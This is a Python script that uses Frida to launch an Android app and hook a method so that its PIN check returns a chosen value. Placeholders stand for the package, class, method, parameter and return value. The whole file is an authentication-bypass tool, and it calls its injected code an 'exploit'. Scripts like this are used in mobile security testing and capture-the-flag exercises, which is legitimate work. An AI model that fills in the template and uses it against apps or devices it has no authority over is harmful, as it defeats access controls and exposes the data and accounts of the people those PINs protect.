#!/usr/bin/env python3

import frida
import sys

package_name = "INSERT_PACKAGE_HERE"

script = """
Java.perform(function() {
    console.log("[ * ] Starting implementation override...")
    var PinUtil = Java.use("INSERT_CLASS_HERE");
    PinUtil.INSERT_METHOD_HERE.implementation = function(INSERT_PARAMETER_HERE) {
        console.log("[ + ] PIN check successfully bypassed!")
        return INSERT_RETURN_VALUE_HERE;
    }
});
"""

try:
    print("[ * ] Looking for app: " + package_name)
    device = frida.get_usb_device(10)
    print("[ * ] Launching app...")
    pid = device.spawn([package_name])
    device.resume(pid)
    session = device.attach(pid)
    exploit = session.create_script(script)
    print("[ + ] App launched. Loading exploit...")
    exploit.load()
    sys.stdin.read()
except frida.ServerNotRunningError:
    print("[ - ] Frida server is not running! Exiting...")
except frida.NotSupportedError:
    print("[ - ] Unable to find application. Please, install it first!")
except frida.ProcessNotFoundError:
    print("[ - ] Unable to find process. Launch the app and try again!")
except KeyboardInterrupt:
    print("\n[ - ] Interrupted. Exiting...")
